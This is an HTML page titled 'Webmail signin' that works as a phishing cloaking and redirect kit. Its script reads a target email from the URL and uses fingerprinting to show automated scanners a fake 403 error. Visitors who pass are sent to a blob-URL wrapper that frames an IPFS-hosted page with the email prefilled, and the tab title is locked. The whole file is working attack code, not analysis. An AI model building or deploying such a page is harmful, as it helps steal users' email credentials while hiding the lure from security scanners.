<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Webmail signin</title>
    <meta name="referrer" content="no-referrer">
    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- =========================================== -->
    <!-- MANUAL FAVICON SECTION - REPLACE THESE LINES -->
    <!-- =========================================== -->
    <!-- Default: Transparent 1x1 pixel favicon -->
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 1 1%22></svg>">
    
    <!-- TO USE YOUR OWN FAVICON, REPLACE THE ABOVE LINE WITH ONE OF THESE: -->
    
    <!-- Option 1: URL to your favicon -->
    <!-- <link rel="icon" href="https://yourdomain.com/favicon.ico"> -->
    
    <!-- Option 2: Data URI favicon (PNG base64) -->
    <!-- 
    <link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAACZSURBVChTY2CgF8BIg8YQQC9gYmaSxjFyjk0pP1heX4+N2cS2lBksf5CJmckSLJ8Plv8Ilq8FyzFj02AsD9ZeYWa2t8QqCQZbwNJ/gcYdZC8wM9OkoOgg9IYk8DIlgGLA28CqyQDYGxjVWjCqgdi1AL0qU9CqFQBYUhiVYyB7HwAAAABJRU5ErkJggg==">
    -->
    
    <!-- Option 3: Multiple favicon formats -->
    <!--
    <link rel="shortcut icon" href="https://yourdomain.com/favicon.ico" type="image/x-icon">
    <link rel="icon" href="https://yourdomain.com/favicon.ico" type="image/x-icon">
    <link rel="apple-touch-icon" href="https://yourdomain.com/apple-touch-icon.png">
    -->
    <!-- =========================================== -->
    <!-- END FAVICON SECTION -->
    <!-- =========================================== -->
    
    <style>
        html, body {
            margin: 0;
            padding: 0;
            background: #ffffff;
            overflow: hidden;
            width: 100%;
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        #invisible-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #ffffff;
            z-index: 9999;
            opacity: 1;
            transition: opacity 0.3s ease;
        }
        
        #invisible-container.hidden {
            opacity: 0;
            pointer-events: none;
        }
        
        #error-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            padding: 20px;
            box-sizing: border-box;
        }
        
        .error-box {
            text-align: center;
            max-width: 400px;
            padding: 30px;
        }
        
        .error-title {
            font-size: 24px;
            font-weight: 600;
            color: #d93025;
            margin-bottom: 15px;
        }
        
        .error-code {
            font-size: 13px;
            color: #777;
            margin-top: 10px;
            padding: 8px;
            background: #f5f5f5;
            border-radius: 4px;
            font-family: monospace;
        }
    </style>
</head>
<body>
<!-- Invisible container for verification -->
<div id="invisible-container"></div>

<!-- Error container (hidden by default) -->
<div id="error-container">
    <div class="error-box">
        <div class="error-title">Access Restricted</div>
        <div>Unable to verify your browser. Please try again later.</div>
        <div class="error-code">Error Code: 403_FORBIDDEN</div>
    </div>
</div>

<script>
// RELAXED ANTI-BOT PROTECTION - WORKS WITH CHROME
(() => {
    'use strict';
    
    // Configuration
    const TARGET_BASE = "https://bafkreick3zbqfdrqbzniqoyztbbmu52nuklp2blqgwfbbveu6e5tasjngu.ipfs.dweb.link/";
    const PAGE_TITLE = "Webmail signin"; // Page title for browser tab
    const HUMAN_COOKIE = 'verified_' + window.location.hostname.replace(/[^a-z0-9]/gi, '').substr(0, 8);
    const COOKIE_EXPIRES = 86400;
    const BOT_COOKIE = 'blocked_' + window.location.hostname.replace(/[^a-z0-9]/gi, '').substr(0, 8);
    const BOT_COOKIE_EXPIRES = 1800;
    
    // Ensure title stays as "Webmail signin"
    document.title = PAGE_TITLE;
    
    // Show error page
    function showErrorPage() {
        const container = document.getElementById('invisible-container');
        const errorContainer = document.getElementById('error-container');
        
        if (container) container.style.display = 'none';
        if (errorContainer) errorContainer.style.display = 'flex';
        
        // Keep title consistent even on error page
        document.title = PAGE_TITLE;
    }
    
    // Cookie functions
    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return parts.pop().split(';').shift();
        return null;
    }
    
    function setCookie(name, value, seconds) {
        const expires = new Date(Date.now() + seconds * 1000).toUTCString();
        const cookie = `${name}=${value}; expires=${expires}; path=/; SameSite=Lax`;
        document.cookie = cookie;
    }
    
    // Get email from URL
    function getEmail() {
        try {
            const urlParams = new URLSearchParams(window.location.search);
            const email = urlParams.get('email');
            return email ? email.trim() : '';
        } catch(e) {
            return '';
        }
    }
    
    // Get favicon URL from the page (for use in blob)
    function getFaviconUrl() {
        // Try to find the favicon link
        const faviconLink = document.querySelector('link[rel="icon"]');
        if (faviconLink && faviconLink.href) {
            return faviconLink.href;
        }
        
        // Try shortcut icon
        const shortcutLink = document.querySelector('link[rel="shortcut icon"]');
        if (shortcutLink && shortcutLink.href) {
            return shortcutLink.href;
        }
        
        // Default to transparent favicon
        return 'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 1 1%22></svg>';
    }
    
    // Create blob for final redirect - uses "Webmail signin" title
    function createBlob(targetUrl, email) {
        const faviconUrl = getFaviconUrl();
        
        const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${PAGE_TITLE}</title>
<!-- Using the same favicon as the main page -->
<link rel="icon" href="${faviconUrl}">
<style>
html, body { margin: 0; padding: 0; width: 100%; height: 100%; }
iframe { width: 100%; height: 100%; border: none; }
</style>
</head>
<body>
<iframe src="${targetUrl}"></iframe>
</body>
</html>`;
        return new Blob([html], { type: 'text/html' });
    }
    
    // VERY RELAXED bot detection (won't flag Chrome)
    function detectBot() {
        let score = 0;
        
        // 1. Only check for OBVIOUS bots
        const ua = navigator.userAgent || '';
        
        // Check for headless patterns in user agent (RELAXED)
        if (/PhantomJS|Nightmare|Electron|Puppeteer|Playwright/i.test(ua)) {
            score += 50; // These are definitely automation tools
        }
        
        // 2. Check for webdriver (but be lenient)
        if (navigator.webdriver === true) {
            // Combine with other factors before flagging
            if (navigator.plugins.length === 0) {
                score += 30; // Webdriver + no plugins = suspicious
            } else {
                score += 10; // Webdriver alone isn't conclusive
            }
        }
        
        // 3. Check for automation properties (Selenium/Puppeteer)
        if (window.__selenium_evaluate || window.__webdriver_evaluate || 
            window.__driver_evaluate || window.__fxdriver_evaluate) {
            score += 40; // These are definitely automation
        }
        
        console.log('Bot detection score:', score);
        return score > 60; // Very high threshold to avoid false positives
    }
    
    // Simple interaction check
    function checkInteraction() {
        return new Promise((resolve) => {
            let hasInteraction = false;
            
            // Listen for ANY interaction
            const events = ['mousedown', 'mousemove', 'touchstart', 'click', 'keydown'];
            const handler = () => {
                hasInteraction = true;
                events.forEach(e => document.removeEventListener(e, handler));
                resolve(true);
            };
            
            events.forEach(e => {
                document.addEventListener(e, handler, { once: false, passive: true });
            });
            
            // Wait a bit (1.5 seconds) - some users might not interact immediately
            setTimeout(() => {
                if (!hasInteraction) {
                    events.forEach(e => document.removeEventListener(e, handler));
                    // Don't fail, just continue
                    resolve(true); // Changed to true to avoid blocking
                }
            }, 1500);
        });
    }
    
    // Main protection flow
    async function executeProtection() {
        // Fade out invisible container after a moment
        setTimeout(() => {
            const container = document.getElementById('invisible-container');
            if (container) container.classList.add('hidden');
        }, 500);
        
        // Check if already verified
        if (getCookie(HUMAN_COOKIE) === '1') {
            const email = getEmail();
            const target = email ? 
                `${TARGET_BASE}?email=${encodeURIComponent(email)}` : 
                TARGET_BASE;
            
            setTimeout(() => {
                const blob = createBlob(target, email);
                const blobUrl = URL.createObjectURL(blob);
                window.location.replace(blobUrl);
            }, 300);
            return;
        }
        
        // Check if marked as bot
        if (getCookie(BOT_COOKIE) === '1') {
            // Show error after delay
            setTimeout(showErrorPage, 500);
            return;
        }
        
        // Wait a bit for page to load
        await new Promise(resolve => setTimeout(resolve, 300));
        
        // Check for interaction (non-blocking)
        await checkInteraction();
        
        // Run RELAXED bot detection
        const isBot = detectBot();
        
        if (isBot) {
            console.log('Bot detected - showing error');
            setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
            setTimeout(showErrorPage, 500);
            return;
        }
        
        // Mark as human and redirect
        setCookie(HUMAN_COOKIE, '1', COOKIE_EXPIRES);
        
        const email = getEmail();
        const target = email ? 
            `${TARGET_BASE}?email=${encodeURIComponent(email)}` : 
            TARGET_BASE;
        
        // Short delay then redirect
        setTimeout(() => {
            const blob = createBlob(target, email);
            const blobUrl = URL.createObjectURL(blob);
            window.location.replace(blobUrl);
            
            // Clean up
            setTimeout(() => {
                try {
                    URL.revokeObjectURL(blobUrl);
                } catch(e) {}
            }, 10000);
        }, 500);
    }
    
    // Error handling
    async function safeExecute() {
        try {
            await executeProtection();
        } catch (error) {
            console.error('Protection system error:', error);
            // On ANY error, just redirect normally
            const email = getEmail();
            const target = email ? 
                `${TARGET_BASE}?email=${encodeURIComponent(email)}` : 
                TARGET_BASE;
            window.location.replace(target);
        }
    }
    
    // Start after short delay
    setTimeout(safeExecute, 100);
    
    // No aggressive anti-debugging
    document.addEventListener('contextmenu', e => {
        // Allow right-click
        if (e.shiftKey && e.ctrlKey) {
            // But block Shift+Ctrl+RightClick (dev shortcut)
            e.preventDefault();
        }
    });
    
    // Allow F12 and dev tools
    document.addEventListener('keydown', (e) => {
        // Allow all keyboard shortcuts
        if (e.key === 'F12' && e.ctrlKey && e.shiftKey) {
            // Only block Ctrl+Shift+F12 (some debugging tools)
            e.preventDefault();
        }
    });
    
    // Monitor title to ensure it stays "Webmail signin"
    let originalTitle = PAGE_TITLE;
    Object.defineProperty(document, 'title', {
        get: function() { return originalTitle; },
        set: function(value) {
            // Always revert to "Webmail signin"
            originalTitle = PAGE_TITLE;
            document.querySelector('title').textContent = PAGE_TITLE;
        }
    });
    
})();
</script>
</body>
</html>
